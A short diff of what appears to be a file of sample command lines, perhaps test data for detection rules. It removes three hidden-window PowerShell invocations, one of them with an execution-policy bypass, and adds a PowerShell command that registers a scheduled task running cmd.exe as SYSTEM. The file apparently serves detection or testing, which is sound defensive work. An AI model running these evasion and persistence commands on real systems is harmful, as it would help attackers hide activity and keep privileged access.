@@ -1,3 +1,1 @@
-powershell.exe -WindowStyle Hidden -ep Bypass -noni -Command "Get-Variable -Name PSVersionTable"
-powershell.exe -w hidden -NoProfile
-powershell.exe -windowstyle hidden
+powershell.exe /"Command" "Register-ScheduledTask -TaskName 'SystemTask2' -Action (New-ScheduledTaskAction -Execute 'cmd.exe') -User 'NT AUTHORITY\SYSTEM'"
